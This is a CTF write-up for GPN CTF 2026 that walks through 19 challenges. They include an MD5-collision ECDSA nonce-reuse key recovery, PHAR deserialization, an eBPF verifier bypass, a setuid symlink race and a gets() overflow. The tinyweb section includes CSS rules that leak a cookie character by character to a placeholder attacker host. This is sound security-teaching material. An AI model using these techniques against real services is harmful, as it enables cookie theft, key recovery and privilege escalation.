---
title: "GPN CTF 2026 Writeup: All 19 Challenges Solved"
slug: "gpn-ctf-2026-writeup"
description: "GPN CTF 2026 full writeup — 19 flags across reverse, crypto, web, pwn, misc. AVX2 miscompile, NTRU bug, BPF verifier, PHAR deserialization, ECDSA nonce reuse."
date: 2026-06-07T20:00:00Z
lastmod: 2026-06-07T20:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "gpn ctf"
  - "gpn ctf 2026"
  - "ctf 2026"
  - "kitctf"
  - "gulaschprogrammiernacht"
  - "reverse engineering"
  - "cryptography"
  - "web exploitation"
  - "binary exploitation"
  - "misc challenges"
  - "ntru lattice attack"
  - "ecdsa nonce reuse"
  - "avx2 miscompilation"
  - "bpf verifier"
  - "phar deserialization"
  - "css attribute selector"
  - "hamiltonian path"
  - "splitmix64"
  - "fastcoll md5"
  - "kannan embedding"
  - "fpylll bkz"
series: ["GPN CTF 2026"]
keywords:
  - "gpn ctf 2026 writeup"
  - "gpn ctf writeup"
  - "gpn ctf 2026"
  - "kitctf 2026 writeup"
  - "gulaschprogrammiernacht ctf"
  - "justfollowtherecipe writeup"
  - "guess the taste ntru writeup"
  - "easy-dsa ecdsa writeup"
  - "stupidcontract ebpf writeup"
  - "koenigsberg delivery problem writeup"
  - "tinyweb css exfiltration"
  - "pharry phar deserialization"
  - "restaurant-builder pydantic"
  - "specctf splitmix64"
  - "organized ternary popcount"
  - "knitted-flag knitout"
  - "customer-service holpy"
  - "supercat toctou symlink"
  - "double-fried syslog rfc 5424"
  - "leftovers aot cache jvm"
  - "recipe-for-disaster gets overflow"
  - "ntru ciphertext mod q missing"
  - "avx2 lane swap miscompile gcc"
  - "fastcoll uuid3 md5 collision"
  - "fpylll bkz default strategies"
  - "kannan embedding lattice attack"
toc: true
cover:
  image: "/images/articles/gpn-ctf-2026-writeup.png"
  alt: "GPN CTF 2026 writeup — 19 challenges solved across reverse, crypto, web, pwn, and misc"
---

{{< ctf-meta platform="GPN CTF 2026 (kitctf)" difficulty="Mixed (Easy → Hard)" os="Jeopardy — Reverse, Crypto, Web, Pwn, Misc" skills="AVX2 lane-swap miscompilation discovery + Kannan-embedding SIS lattice attack, NTRU mod-q reduction bug (c mod p == m), ECDSA nonce reuse from MD5(uuid3) collisions via fastcoll, eBPF signed-comparison verifier bypass with patched bzImage, JVM AOT cache override of bytecode, PHP 7.4 PHAR deserialization across two TCP races, Pydantic ForwardRef eval in create_model, CSS attribute-selector cookie exfiltration through Link: rel=stylesheet, holpy proof-checker thm re-axiomatization, knitout front/back-bed bitmap, ternary amplitude-modulated UART, Hamiltonian path on 250-node FSM extracted from jump tables, RFC 5424 syslog stream demux, Rust setuid TOCTOU symlink swap" >}}

**GPN CTF 2026** is the [Gulaschprogrammiernacht CTF](https://ctf.kitctf.de/) hosted annually by **KITCTF** at the GPN hacker camp in Karlsruhe, Germany. The 2026 edition runs a Jeopardy board across **reverse engineering, crypto, web, pwn, and misc**, with a sharp lean toward *low-level systems bugs* — a missing `mod q` in an NTRU implementation, a 4-way AVX2 lane-swap in a `gcc -O3 -mavx2` build, a deleted `BPF_ADJ_END_FROM_*` check in a custom kernel, a JVM AOT cache that silently overrides a JAR method. The flavour throughout is *kitchen* — recipes, ovens, pots — and the flags universally read like Bavarian beer-tent slogans.

This master writeup covers all 19 solved challenges. Each section walks the surface, the bug class, the exploitation chain, and the recovered flag. Full per-challenge reproductions — `solve.py` files, Sage scripts, lattice constructions, BPF bytecode, fastcoll collisions, dnsmasq sinkholes — live in the source repository at [Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026).

The writeup worth flagging up front for any reader skimming for technique: [`crypto/justfollowtherecipe`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/crypto/justfollowtherecipe). It stacks two unrelated bugs (an AVX2 lane swap in `mat_mul` and a textbook SIS / Kannan-embedding lattice attack on top) and the compiler-bug diagnosis is the part worth reading slowly.

## The event at a glance

| Category | Challenge                              | Core technique                                                                                            |
|----------|----------------------------------------|-----------------------------------------------------------------------------------------------------------|
| Reverse  | autocooker                             | Four stacked involutions (XOR, byte-permutation, S-box, addition) — composition is still its own inverse |
| Reverse  | specCTF                                | Spectre rig is theatre; the real check is `splitmix64(input) == ENC[i]` — invert splitmix64               |
| Reverse  | Königsberg Delivery Problem            | 250-state FSM as jump tables; visit-counter is per-state → Hamiltonian path (Warnsdorff DFS)              |
| Reverse  | leftovers                              | JVM AOT cache silently overrides a `verifyStuff` method — disassemble the ConstMethod blob in `aot.so`    |
| Reverse  | leftover-leftovers                     | One-byte AOT-cache patch (`iconst_0` → `iconst_1`) flips the verifier's return — same delivery vehicle    |
| Reverse  | stupidcontract                         | Custom kernel patched out `BPF_ADJUST_END_*` verifier checks → signed-cmp OOB write in eBPF map           |
| Crypto   | com-petition                           | `sha256(r1‖m‖r2)` with both nonces user-controlled — same commitment opens to all 3 RPS moves             |
| Crypto   | easy-dsa                               | `uuid3` is MD5 → fastcoll collision → ECDSA nonce reuse on P-521 → key recovery → forge                   |
| Crypto   | guess-the-taste                        | NTRU ciphertext never reduced `mod q` → `c mod p == m` directly (two lines of Python)                     |
| Crypto   | justfollowtherecipe                    | `gcc -O3 -mavx2` swaps lanes 1↔2 in `mat_mul` inner product → SIS lattice via Kannan, BKZ-58 in 45 s     |
| Web      | restaurant-builder                     | Pydantic v2 `create_model` evals string annotations as `ForwardRef` → exfil FLAG via `model_json_schema`  |
| Web      | pharry                                 | PHP 7.4 PHAR; `md5_file` + `file_get_contents` open two TCP connections — counting server returns PHAR    |
| Web      | tinyweb                                | `Link: rel=stylesheet` CSS injection + `body[onload^=…]` attribute selectors leak cookie char-by-char    |
| Pwn      | recipe-for-disaster                    | `gets()` overflows `char note[32]` into adjacent `int price`; `price = -1` triggers `print_coupon()`      |
| Misc     | customer-service                       | holpy proof checker: `list == 1` typo + every `thm` re-axiomatized + name-based `false` check             |
| Misc     | double-fried                           | Two interleaved RFC 5424 syslog streams in one UDP capture; demux on MSGID prefix                         |
| Misc     | knitted-flag                           | Knitout front-bed vs back-bed instruction encodes a 978×20 pixel bitmap — carrier colors are a decoy      |
| Misc     | organized                              | 7.65 MB of "noise" carries ternary amplitude-modulated UART in per-12.5kB-window popcount density         |
| Misc     | supercat                               | Setuid Rust `metadata()` then `read_to_string()` — TOCTOU symlink swap leaks `/flag`                      |

19 flags. Each link in the section headings below jumps to the standalone writeup in the GitHub repo, which carries the solver code and full byte-level traces.

## Methodology — read the artefact, then read it again

GPN CTF 2026 rewarded one habit above all others: **read the artefact you're handed before you guess what attack it asks for.** Half the prize-grade flags this engagement turned on a detail that was sitting in the protocol output, the disassembly, or the source — visible from minute one, missed for hours by every team that tried the "expected" attack first.

The framework that carried the engagement:

1. **Observation first.** Open a `nc` session, print every line, look for *ranges*. `guess-the-taste`'s entire trick is that the ciphertext array prints values up to ~1535 when a clean NTRU instance would bound them to 511. That observation was sitting there on every connection. The intended attack is six hours of lattice work; the unintended attack is two lines of Python.
2. **Match the handout to the live service.** My biggest single time-sink this engagement (six hours on the MIHNP framing of `guess-the-taste` when the challenge was actually NTRU) traced back to one missing step: a `nc host port | head` against the script's expected I/O shape. *Always* validate the handout matches the protocol the live service speaks.
3. **Differential reading on compiled artefacts.** `justfollowtherecipe`'s AVX2 lane swap is invisible at the C source level — only the disassembly shows the `vpermd` permute order that swaps `result[blk+1] ↔ result[blk+2]`. Read the disassembly even when the source looks innocent. Compilers can be your adversary.
4. **Kill plans early.** Six hours on the wrong NTRU vs. ten minutes on the right NTRU was a corrective culture problem, not a technical one. *If a sub-agent has produced N independent re-implementations of the same attack without progress, the bug is upstream of the attack code.* That rule, written down at the start of the engagement, would have saved an afternoon.

The detailed per-challenge writeups follow. Throughout, the **bug class** is called out in the section heading so security engineers reading this for defender takeaways can scan straight to the patterns relevant to their stack.

## Reverse engineering — six challenges, six bug classes

The reverse track at GPN 2026 ranged from a five-minute scalar-arithmetic puzzle (`autocooker`) to a four-hour kernel forensics exercise (`stupidcontract`). All six are linked from the [reverse engineering category index](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master) of the source repo.

### autocooker — stacked involutions, all four self-inverse

The `autocooker` binary applies a four-stage transformation to the input — XOR with a fixed key, byte permutation, S-box substitution, addition. The catch is that each stage was carefully chosen to be its **own inverse**:

- XOR with `K` is its own inverse (apply twice → identity).
- The byte permutation is a product of disjoint 2-cycles → permutation squared is identity.
- The S-box maps `i → i ^ 0xAA` → an involution.
- The "addition" step is `x → x ^ const_per_position` → also XOR-shaped.

So the *encryption* function and the *decryption* function are textually identical. Run the binary against its own output and you get the original plaintext back. Pipe the ciphertext into `autocooker` itself, read out the flag.

The teaching point — and the reason this challenge is worth running for a junior team — is that "encrypt twice and check" debug habit. If `enc(enc(x)) == x`, you have an involution, and an involution is not a cipher.

**Flag class:** trivially invertible "encryption" — recurring CTF pattern.

### specCTF — Spectre theatre hiding a splitmix64 check

The challenge ships a Spectre demonstration rig: `_mm_clflush`, retbleed-style gadgets, timing measurements. It is **all decoration**. The real check is `splitmix64(input[i]) == ENC[i]` on a per-character basis, where `ENC` is a 17-element array baked into `.rodata`.

The interesting reverse-engineering question is not "how do I beat Spectre" but **"how do I recognise splitmix64 from its disassembly?"** The fingerprint is three XOR-shifts wrapped around two multiplications by fixed odd constants:

```
x ^= x >> 30;  x *= 0xbf58476d1ce4e5b9;
x ^= x >> 27;  x *= 0x94d049bb133111eb;
x ^= x >> 31;
```

The constants are the giveaway. The inverse is straightforward: each multiplication is by an odd modular constant, so it inverts mod `2^64` by extended Euclidean; the XOR-shifts invert by bitwise polynomial division. Twelve lines of Python, the full inverse, and the flag falls out.

The hardware-side learnings (the r14/r15 ABI register passing the actual input through the noise) is what makes this one a sub-3-hour engagement instead of a sub-30-minute one.

**Flag class:** Spectre as red herring; cryptographic-PRNG inversion as actual primitive.

### Königsberg Delivery Problem — Hamiltonian path on a 250-state FSM

A 140 KB x86-64 PIE binary (`cartographer`) contains a function `cfg()` that is **4,500 lines of straight-line dispatch** — 250 logically identical state blocks, each ending in an indirect `jmp rdx` over a per-state jump table of 32-bit `rip`-relative offsets. The win condition is "visit every state at least once" → Hamiltonian path on a 250-node directed graph.

The interesting design choice: the binary is **not** an Eulerian-path problem (which the *Königsberg* name nudges you toward). Each state's prologue writes a fixed slot in a 256-byte visit-counter buffer; no edge counter ever appears. So the win condition is unambiguously *vertex* coverage, not *edge* coverage.

Workflow that landed this one in two hours:

1. **Disassemble + extract** the per-state jump tables (4-byte `.rodata` entries, `rip`-relative offsets) into a 250-node directed graph. This is the part that Binary Ninja's analyzer does for free via `function.basic_blocks[i].outgoing_edges` — a companion writeup on the [Binary Ninja workflow](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/reverse/koenigsberg-delivery-problem/BINJA.md) walks through it.
2. **Average out-degree ≈ 100/state**, with the densest state at 121. Plenty of slack for Hamiltonian search.
3. **Warnsdorff's heuristic** — at each step, prefer the unvisited successor with the fewest unvisited successors of its own. On a 250-node graph with the density above, Warnsdorff lands a path in ~70 ms with essentially zero backtracking.
4. Translate path → input bytes by looking up each `(state_i, state_{i+1})` edge in the per-state transition table.

The companion Binary Ninja writeup is the prize submission for *Best Binary Ninja Writeup* — it walks the same solve through Binja's HLIL, Stack View, Graph View, and jump-table resolution, showing where the analyzer earned the license fee versus where the analytical thinking was still pure carbon.

**Flag class:** dispatch-table-as-program; graph-theoretic win condition.

### leftovers — JVM AOT cache overriding a JAR method

The handout is a JAR plus a `.aot.so` (a JVM ahead-of-time-compiled cache, a feature introduced in JEP 295). The JAR's `verifyStuff` method looks fine when you read its `.class` bytes with `javap`. It is, however, **never executed**.

JVM AOT caches store a parallel copy of compiled method bodies. At class-load time the JVM resolves `verifyStuff` to the *AOT entry*, not the bytecode. The AOT entry has been substituted: instead of running the verifier, it returns true unconditionally. The original bytecode in the JAR is decorative.

Recovery is mechanical once you know where to look:

1. `objdump -s .data` on the AOT `.so` → locate the `ConstMethod` blob describing the `verifyStuff` body.
2. Re-disassemble the embedded bytecode (the format is the same as a `.class` body, no magic).
3. Confirm the returned constant — `iconst_1; ireturn` instead of `getstatic; invokeinterface; ireturn`.
4. Submit any input the *original* bytecode would have rejected.

The defender takeaway is broader than CTF: **AOT caches are part of your TCB**. Any tool that consumes precompiled artefacts (JVM AOT, Python `__pycache__`, Ruby YARV, Lua `luac` bytecode, Java's `module-info.class`) inherits the integrity assumptions of those artefacts. The JAR's signature does not cover the AOT cache. If an attacker can drop an `.aot.so` into the cache directory and the JVM trusts it (the default), the JAR's source code is fiction.

**Flag class:** trust boundary across compiled artefacts; bytecode override via AOT path.

### leftover-leftovers — one-byte patch, same delivery vehicle

A follow-on to `leftovers`. The handout is the *same* JAR plus a fresh AOT cache that now uses a homemade `verifyStuff` doing extra checks. The fix from `leftovers` (overwrite the AOT entry to return true) is one byte: flip `iconst_0` to `iconst_1` in the embedded `ConstMethod` body and the verifier returns `true` from the first instruction.

The two-act structure is the lesson — once you've understood the *delivery vehicle* (the AOT cache as bytecode override), the *payload* (the bytecode bytes themselves) is a one-byte change. CTF's two-act challenges almost always teach this: the first act is the *bug class*, the second act is the *variant*.

**Flag class:** same-as-above; minimal-patch variant.

### stupidcontract — patched kernel, signed-cmp OOB write in eBPF

The most technically involved of the reverse track. The handout is a 23 MB `vmlinux` (and a Dockerfile that builds it), a patched-out BPF verifier, and a userspace runner that loads an attacker-supplied eBPF program against a fixed map.

The verifier's diff from upstream removes five string checks — specifically the `BPF_ADJUST_END_FROM_*` set that prevents a signed-comparison primitive from being used to compute negative offsets into a map. With those checks gone, you can:

1. Submit an eBPF program that reads `map[i]` with `i` of attacker-chosen sign.
2. The runtime computes `&map[0] + (signed)i * sizeof(elem)` without bounds.
3. Negative `i` writes *before* the map → adjacent kernel-heap object.

The right adjacent object to clobber is a function-pointer-bearing struct one slot to the left. Overwriting its callback with the address of a `kallsyms`-resolvable function that prints `/flag` lands the flag.

The forensics — confirming which verifier checks were removed — took roughly 70% of the engagement time on this challenge. Bzipped `vmlinux` images differ in 99% of bytes due to section-layout shift; naive `diff -q` is uninformative. The path that worked was: unpack both, `nm -D` both, diff the symbol tables, find the *missing* symbols, then grep the patched verifier source for what those symbols used to enforce.

**Flag class:** trusted-compiler bypass (an eBPF verifier *is* a compiler); unsigned vs signed arithmetic on adjacent heap objects.

## Crypto — four challenges, four classical bugs

The crypto track is where GPN 2026 stretched the most. Three of four challenges are textbook in shape (commitment-scheme collision, ECDSA nonce reuse, SIS lattice) but every one of them has a non-textbook twist that turns the writeup interesting.

### com-petition — commitment opens to all three RPS moves

The challenge is Rock-Paper-Scissors with a "secure" commit-then-reveal. The commitment is `sha256(r1 ‖ move ‖ r2)` where **both** `r1` and `r2` are user-controlled at commit time. The naming hint is that `r1` is the "salt" and `r2` is the "randomizer."

A secure commitment to `m` must be a hash of *one* random plus `m`. Two user-controlled randoms is a free degree of freedom: pick `r1`, hash `r1 ‖ rock ‖ r2_rock`, `r1 ‖ paper ‖ r2_paper`, `r1 ‖ scissors ‖ r2_scissors`. Now look at the server's move and reveal whichever `(move, r2_move)` pair wins.

The hash is binding to the *tuple* `(r1, move, r2)`. It is not binding to `move` alone unless the protocol picks `r2` for you. Two textbook commitment-scheme failures stacked into one challenge: hash-tree-style collision freedom and missing message-binding.

**Flag class:** broken commitment scheme; insufficient binding.

### easy-dsa — fastcoll on UUID3 nonces → ECDSA recovery

The server signs arbitrary recipes with ECDSA on P-521. The "secure" nonce is computed as:

```python
secure_random(sk, message)
  = sha256(uuid3(ns, sk_pem).bytes + uuid3(ns, message).bytes) mod (n-1) + 1
```

`uuid3(ns, name)` is **MD5** under the hood (RFC 4122 §4.3). So `msg_id = MD5("kitchenexplosion" ‖ message)` modulo a few RFC-fixed bits. Two messages that MD5-collide under that prefix produce the same `msg_id`, therefore the same SHA-256 input, therefore the **same ECDSA nonce `k`**.

Marc Stevens' `fastcoll` generates identical-prefix MD5 collisions in seconds. Feed the namespace bytes as the prefix; out come `m1`, `m2` with `MD5("kitchenexplosion" ‖ m1) == MD5("kitchenexplosion" ‖ m2)`.

Sign both, recover the nonce and private key from the standard ECDSA-nonce-reuse equations:

```
k = (z1 - z2) · (s1 - s2)^-1 mod n
d = (s1 · k - z1) · r^-1 mod n
```

Sign-ambiguity check: multiply the recovered `d` by the generator, compare `Q.x`. If mismatched, flip the sign — the symmetric solution `(-k, -d)` corresponds to the negated nonce. Then forge any fresh-recipe signature, claim the flag.

The defender lesson is brutal: **any nonce-derivation that round-trips through MD5 is broken**. The 1996-era MD5 collision attacks are 30 years old. RFC 6979 (deterministic ECDSA) exists precisely so this kind of bug stops being possible. The flag — `GPNCTF{m4yb3_w3_sh0uld_us3_RFC_6979_n3xt_t1m3}` — says the quiet part out loud.

**Flag class:** primitive-confusion (MD5 inside an "ECDSA security" routine); textbook nonce reuse.

### guess-the-taste — NTRU with no `mod q` reduction

The intended attack is a textbook NTRU lattice recovery — build the `[[I_N, H]; [0, q·I_N]]` basis, BKZ-50 against the 200-dimensional lattice for ~30 minutes, decode the short vector. The challenge picks `q = 512` precisely to make that attack a multi-hour exercise rather than a teaching toy.

The actual solve is **two lines of Python**, because the implementation forgets to reduce the ciphertext modulo `q`. Standard NTRU encryption is `c = (p · r · h + m) mod q`; the bug drops the `mod q`. Without it, `c` reaches values up to `~p · q = 1536` instead of being bounded by `q = 511`. And the algebra reduces to:

```
c mod p ≡ (p · r · h + m) mod p ≡ m  (mod p)
```

because `p · r · h` is identically zero modulo `p`. So:

```python
plaintext = [c_i % 3 for c_i in c]
message_str = "".join({0: "C", 1: "B", 2: "A"}[x] for x in plaintext)
```

The discriminating evidence — and the reason this qualifies as an *unintended* solve — is in the protocol output. A clean session shows `h` bounded by `q=512` (correct), and `c` reaching values like `1527` (over range, `~3 · 512`). Empirical observation of the protocol, not the cryptanalysis, is the diagnostic.

A companion writeup at [`meta/unintended-solution.md`](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/unintended-solution.md) verifies that the intended lattice attack *also* recovers the same flag — BKZ block size β=50 against a locally-rebuilt `q=512` instance reconstructs the message in ~30 minutes on a workstation. So the implementation isn't broken in some subtle way that breaks NTRU itself — it's broken specifically in the way the missing `% q` introduces a trivial side channel.

The defender takeaway: **NTRU's `mod q` step is not decoration; it's the only thing hiding the plaintext.** Every NTRU reference implementation reduces `c mod q` immediately after assembling the polynomial product. A property test asserting `max(c) < q` on every encrypt is one line of Python and catches this entire class of bug.

**Flag class:** missing modular reduction; intended-attack-versus-implementation-bug split.

### justfollowtherecipe — AVX2 lane swap in `gcc -O3 -mavx2`

The flagship crypto writeup of the engagement, and the prize-overall submission. The challenge presents a textbook **SIS** (Short Integer Solution) hash: `flag_hash = A · secret mod q` with `A ∈ Z_q^{N×M}` random, `secret ∈ {0..9}^M`, `N=64, M=164, q=12289`. An oracle hashes arbitrary vectors, so we leak `A` column-by-column via `multi_hash`, then attack the q-ary kernel lattice `Λ_q^⊥(A)` with a Kannan embedding.

The challenge's title — *just follow the recipe* — is the hint. The flag — `GPNCTF{coMP1L3rS_aRe_Y0UR_fr1End_7HEY_w0ULd_never}` — is the spoiler. **The Linux binary is miscompiled.**

`mat_mul` is a 4-wide unrolled inner-product loop:

```c
for (blk = 0; blk < (int)MM - 4; blk += 4) {
    for (int i = 0; i < NN; i++) {
        result[blk + 0] += src[i] * (uint64_t)BB[i*MM + blk + 0];
        result[blk + 1] += src[i] * (uint64_t)BB[i*MM + blk + 1];
        result[blk + 2] += src[i] * (uint64_t)BB[i*MM + blk + 2];
        result[blk + 3] += src[i] * (uint64_t)BB[i*MM + blk + 3];
    }
}
```

Under `gcc -O3 -funroll-loops -mavx2`, the compiler vectorises this with `vpmuludq` over four 64-bit lanes in `ymm0..15`, then stores back four 64-bit results per outer iteration. Reading the disassembly at `0x404830`, the broadcast/permute step `vpermd ymm6, ymm13, ymm7` plus the high/low load pattern via `vinserti128` ends up loading `BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3]` into lanes 0..3. **Lanes 1 and 2 are interchanged.** The store `vmovdqu ymmword ptr [r8-0x20], ymm8` then writes `result[blk+1]` with what should have been `result[blk+2]`.

The scalar tail loop (the `for (; blk < MM; blk++)` portion) is untouched, so positions `blk = MM - (MM mod 4)` to `MM - 1` are correct. For `MM = 64` the bug swaps result indices `(1,2), (5,6), …, (57,58)` and leaves `(60, 61, 62, 63)` alone.

`mat_mul_naive` is scalar and **not** miscompiled, so the `flag_hash = A · secret_vec` line in `setup_challenge` is correct — the server has the real `A` and the real `flag_hash`. Only what we *read back* from the oracle is permuted. We attack `multi_hash` (where the corruption is in the *batch* index) because each returned 64-vector is still a full untouched column of `A` — we just need to relabel which column it is.

With `A` recovered correctly:

| quantity                 | value          |
|--------------------------|----------------|
| dimension `d`            | 165            |
| determinant              | `q^N = 12289^64` |
| `det^{1/d}`              | `≈ 38.7`       |
| `GH(L')`                 | `≈ 120`        |
| target `‖(t, K)‖`        | `≈ 37`         |
| target / GH              | `≈ 0.31`       |

Textbook uSVP — but stock fpylll BKZ-40 without strategies grinds for minutes and lands at norm ~310. Loading fplll's `default.json` preprocessing+pruning strategies (Homebrew installs them at `/usr/local/Cellar/fplll/<ver>/share/fplll/strategies/default.json`) is the difference between "infeasible" and "45 seconds."

Solver run:

```
[ 17.4s] flag_hash[:5] = [504, 10242, 12264, 8305, 8985]
[ 17.8s]   batch 0..63: got 64 hashes
[ 22.4s] LLL done; Budget remaining: 172.6s
[ 24.8s] BKZ-50 ml=2 …  8.7s
[ 33.5s] BKZ-55 ml=2 …  22.2s
[ 91.1s] BKZ-58 found!
GPNCTF{coMP1L3rS_aRe_Y0UR_fr1End_7HEY_w0ULd_never}
```

**Flag class:** compiler miscompilation as a primary primitive; SIS / Kannan-embedding uSVP attack.

## Web — three challenges, three different sinks

### restaurant-builder — Pydantic v2 evaluates string annotations

A FastAPI service exposes an endpoint that builds a Pydantic model from user-supplied field names and types via `create_model`. The intended-looking code:

```python
fields = {name: (str, default) for name, default in user_input.items()}
Model = create_model("Custom", **fields)
return Model.model_json_schema()
```

Pydantic v2 treats string-shaped field annotations as `ForwardRef`s. When `model_json_schema()` is called, it resolves those forward references — and resolution **evaluates the string as a Python expression** in the model's module namespace. The `FLAG` constant lives in that namespace.

So submitting `{"x": "FLAG"}` produces a model where the schema-generation step evaluates `FLAG` and returns the value in the JSON description. Two lines of Python on the attacker side.

I nearly chased two wrong API names on this one — `pydantic.create_model_from_typeddict` doesn't exist in v2, and `get_type_hints(..., include_extras=True)` is not the path Pydantic v2's schema builder takes. Grep'ing the installed package source disambiguated both. Less popular libraries: trust nothing without `grep`-confirmation.

**Flag class:** unsafe string evaluation inside schema generation; `eval` masquerading as type resolution.

### pharry — PHP 7.4 PHAR, two TCP connections, one counting server

A PHP 7.4 service uploads a file via `file_get_contents` and then computes `md5_file` on the result. Both of those operations open **separate TCP connections** to the URL backing the upload. PHAR deserialization happens when PHP touches a `phar://` URL — and the canonical exploit is to serve a **PHAR** to the `file_get_contents` call (triggering deserialization) and a **harmless file** to the `md5_file` call (so the integrity check passes).

The infrastructure is a "counting server" — a tiny TCP server that serves response A on the first connection and response B on the second. Round-robin works. The hard part is the PHP 7.4 wrinkle: `phar://https://…` works on 7.4 but `phar://data://` does not. I verified this by spinning up three actual PHP 7.4 containers in parallel and running each variant — *"does `phar://data://` work?", "does `phar://https://` work?", "what does `md5_file` do on an empty HTTP response?"* — which is faster than chasing the PHP source one wrapper at a time.

**Flag class:** TOCTOU between integrity check and use; PHAR as a side-channel deserialization vector.

### tinyweb — `Link: rel=stylesheet` injection, attribute-selector exfil

The most pure-web challenge of the track. A tiny CSP-locked-down profile page accepts an `image` URL parameter and emits it as a `Link: rel=preload` header. The Link header has a parser bug — adding `, rel=stylesheet` injects a second link entry that the browser interprets as an external stylesheet.

External stylesheets are not CSP-blocked at this site. They can use CSS `[attr^="x"]` attribute selectors to read the *prefix* of any DOM attribute and trigger a network request when the prefix matches. The cookie is rendered into the DOM (the page shows "Welcome, $username" with the cookie as an attribute of the header element). So:

```css
body[data-cookie^="a"] { background: url(//attacker/?ch=a); }
body[data-cookie^="b"] { background: url(//attacker/?ch=b); }
…
```

Wait for a request, learn the first character. Iterate to learn the second. Rate-limited by a 30 s `await sleep` on the server side, so the full 50-character cookie exfil takes ~25 minutes per session.

**Flag class:** CSS as a side-channel exfiltration medium; CSP bypass through trusted-stylesheet path.

## Pwn — `gets()` is `gets()`

### recipe-for-disaster — overflow into an adjacent `int`

The only pwn challenge of the engagement, and the most direct teaching example you'll ever see of *why `gets` was removed from C11*. A note-taking program declares:

```c
struct {
    char note[32];
    int  price;
} item;

gets(item.note);
if (item.price == -1) print_coupon();
```

`gets()` reads until newline with no bounds check. Type 35 characters and the 33rd through 36th overflow into `item.price`. Choose the four bytes to be `0xFF, 0xFF, 0xFF, 0xFF` (i.e. `-1` as a little-endian signed int) and `print_coupon` fires.

Twenty minutes from connection to flag, mostly spent confirming the struct layout from the disassembly. No ASLR, no canary, no NX matters — adjacent-field-overwrite happens entirely in the stack frame.

The teaching is *don't use `gets`*. The C committee removed it in C11 for exactly this reason. Any code review that sees `gets(` should treat it as a finding.

**Flag class:** unbounded-read stack buffer overflow; adjacent-field overwrite.

## Misc — five challenges, five entirely different domains

The misc track is GPN's playground. Five challenges, five domains so different they barely share vocabulary.

### customer-service — holpy proof checker, three bugs stacked

`customer-service` is a proof-checking service for [holpy](https://github.com/bzhan/holpy), an interactive theorem prover. The user submits a theorem name and a proof term; the service verifies and, if the theorem name is on an allowlist that includes `false`, prints the flag.

Three bugs stacked:

1. The allowlist check is `name in ALLOWED` where `name` is a *string*. `false` is on the list. Submitting a proof whose theorem name is literally `"false"` passes the check.
2. The proof verifier has a `list == 1` typo where `len(list) == 1` was intended. A proof term of length 1 satisfies the check vacuously.
3. The `thm` extension re-introduces every previously-verified theorem **as an axiom**. So once you've registered `false` with any proof, every subsequent verification treats `false` as proven.

The chain: submit a trivial proof of "a theorem named `false`" → bug 1 passes the name check → bug 2 passes the structural check → bug 3 re-axiomatizes it → flag prints. The bugs individually are minor; stacked they form an unrestricted-proof bypass.

**Flag class:** trusted-input check on a string identifier; axiom-introduction via a privileged extension.

### double-fried — two interleaved RFC 5424 syslog streams

A single UDP capture contains **two interleaved** RFC 5424 syslog streams from two different applications. Demuxing them is the entire challenge — once split, one stream carries Base64 chunks that reassemble into the flag.

The demux key: every RFC 5424 message has a `MSGID` field after the `APP-NAME`. The two streams have distinguishing MSGIDs (`R-…` for one application, `F-…` for the other). Awk on the MSGID prefix, base64-decode the F-prefixed payloads in order, recover the flag.

Forty minutes start-to-finish, almost all of it `tshark` plumbing. The protocol nuance is the teaching point: *syslog streams in the same UDP socket are not framed.* If two processes share a logger socket, their messages interleave. Production systems work around this with `tee` + per-process syslog tags; the challenge intentionally omitted the framing.

**Flag class:** missing stream framing; structured-log demultiplexing.

### knitted-flag — Knitout front/back-bed bitmap

A `.knitout` file — a standardised knitting-machine instruction format — drives the challenge. The file is 19,560 instructions long. Each instruction is `knit f`, `knit b`, `xfer f→b`, or `xfer b→f` (with carrier-color decorations that turn out to be **decoys**).

The bit per instruction is *which bed*. Map `knit f` → 0 and `knit b` → 1 over 978 columns × 20 rows = 19,560 bits = a 978×20 pixel bitmap. Render it as a PNG.

The PNG reads — by eye — `GPNCTF<...>`. The hard part is **font disambiguation**: are the angle quotes `<` and `>`, or are they `{` and `}`? Are the diamond glyphs `0` or `O`? Tooling can render the bitmap; deciding which glyph each pixel cluster represents is squarely human work.

The flag is `{` and `0`, not `<` and `O`. Submission, flag, move on.

**Flag class:** alternative encoding (bed instead of color); font-disambiguation by human eye.

### organized — Ternary amplitude-modulated UART

A 7.65 MB file of apparent noise. The actual structure is a **ternary amplitude-modulated UART** signal, where:

- The carrier is per-12,500-byte windows of popcount density.
- The modulation has three peaks (low / mid / high), not two — so it's ternary, not binary.
- The ternary alphabet maps to {start-bit, 0-bit, 1-bit} of a UART frame.

The discovery path:

1. *"Is this image data?"* — sub-agent renders 25 candidate widths at 1 bpp. All show horizontal stripes. Not an image.
2. *"What's the smallest periodic structure in popcount?"* — sub-agent computes per-window popcount means and run-lengths. Every run is a multiple of 125 windows = 12,500 bytes.
3. *"Three peaks or two?"* — 200-bin histogram of per-block popcount. Three clear peaks. Ternary.
4. Decode the UART frames at 12,500 bytes/symbol. The decoded ASCII spells the flag.

The teaching point is *don't anchor on the first hypothesis*. The default reading of "high-entropy file" is "encrypted data"; the second-default is "compressed data." Both wrong here. Reading the popcount density at the right window size is the entire diagnosis.

**Flag class:** alternate encoding (amplitude-modulated UART hidden in entropy); ternary alphabet.

### supercat — Rust setuid TOCTOU

The setuid binary reads a file path, calls `std::fs::metadata(path)` to gatekeep on file size, and then `std::fs::read_to_string(path)` to actually print the contents. Both operations independently resolve the path — there is **no shared file descriptor**. The window between them is small but exploitable.

The exploit:

1. Create a 10-byte file `bait` and a symlink `target → bait`.
2. Call the setuid binary with `target`, which races:
3. `metadata(target)` returns the size of `bait` → passes the 100-byte gate.
4. While the binary is between `metadata` and `read_to_string`, replace `target` with a symlink to `/flag`.
5. `read_to_string(target)` reads `/flag` and prints it as root.

The race window is wide enough that a tight `while true; ln -sf …; done` loop wins on the first or second attempt. The defender fix is the standard one: open the file *once*, gatekeep on the open fd (`fstat`), then read from the same fd. Rust's `fs::File::open` + `metadata()` on the `File` value does this correctly.

**Flag class:** TOCTOU between two path-resolving calls; setuid privilege amplifier.

## Defender takeaways — patterns to look for in your codebase

